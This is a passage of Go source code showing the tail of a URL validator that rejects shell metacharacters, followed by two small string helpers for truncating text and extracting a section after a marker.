	if strings.ContainsAny(rawURL, "|;&$`'\"(){}[]<>!\n\r") {
		return "", fmt.Errorf("URL contains shell metacharacters")
	}
	return rawURL, nil
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

func extractSection(s, marker string, maxLen int) string {
	idx := strings.Index(s, marker)
	if idx < 0 {
		return ""
	}
	end := idx + maxLen
	if end > len(s) {
		end = len(s)
	}
	return s[idx:end]
}
